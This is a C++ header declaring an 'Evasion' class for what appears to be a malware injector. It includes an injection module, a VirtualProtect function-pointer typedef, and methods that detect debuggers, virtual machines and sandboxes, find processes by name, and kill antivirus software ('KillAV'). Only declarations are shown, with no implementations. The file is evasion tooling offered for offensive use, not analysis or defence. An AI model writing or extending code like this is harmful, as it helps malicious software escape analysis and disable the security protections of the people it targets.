#pragma once

#include <iostream>
#include "Executable.h"
#include "Injection.h"

class HandleGuard;

typedef BOOL(WINAPI* VirtualProtect_t)(
	LPVOID,
	SIZE_T,
	DWORD,
	PDWORD);

class Evasion {
public:
	// Attributes
	BOOL mustBeAvoided = FALSE;

	// Methods 
	Evasion();
	Executable process;
	BOOL isBeingDebugging(void);
	BOOL isDomainReachable(void);
	BOOL IsRunningInVM();
	DWORD GetProcessIdByName(const std::string& processName);
	BOOL IsSandboxed();
	VOID KillAV();
};